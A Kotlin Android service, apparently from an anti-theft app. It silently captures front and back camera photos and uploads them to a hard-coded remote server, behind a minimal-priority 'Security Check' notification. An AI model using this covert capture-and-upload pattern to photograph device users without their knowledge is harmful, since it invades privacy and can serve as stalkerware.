package com.antitheft.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class CameraService : Service() {

    companion object {
        const val SERVER_URL = "https://antitheft-admin.onrender.com/upload"
        const val CHANNEL_ID = "antitheft_service"
    }

    private val thread = HandlerThread("CamThread").also { it.start() }
    private val handler = Handler(thread.looper)
    private var capturedFront: ByteArray? = null
    private var capturedBack: ByteArray? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()
        capturePhoto(CameraCharacteristics.LENS_FACING_FRONT) { front ->
            capturedFront = front
            capturePhoto(CameraCharacteristics.LENS_FACING_BACK) { back ->
                capturedBack = back
                uploadBoth()
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Security", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        startForeground(1,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Security Check")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        )
    }

    private fun capturePhoto(facing: Int, callback: (ByteArray?) -> Unit) {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = manager.cameraIdList.firstOrNull {
            manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: run { callback(null); return }

        val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage()
            val buf = img.planes[0].buffer
            val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
            img.close()
            callback(bytes)
        }, handler)

        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cam.createCaptureSession(listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    .apply { addTarget(reader.surface) }.build()
                                s.capture(req, object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        ss: CameraCaptureSession, r: CaptureRequest,
                                        result: TotalCaptureResult
                                    ) { cam.close() }
                                }, handler)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { callback(null) }
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, e: Int) { cam.close(); callback(null) }
            }, handler)
        } catch (e: SecurityException) { callback(null) }
    }

    private fun uploadBoth() {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
        capturedFront?.let { body.addFormDataPart("front", "front.jpg",
            it.toRequestBody("image/jpeg".toMediaType())) }
        capturedBack?.let { body.addFormDataPart("back", "back.jpg",
            it.toRequestBody("image/jpeg".toMediaType())) }

        OkHttpClient().newCall(
            Request.Builder().url(SERVER_URL).post(body.build()).build()
        ).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }
}
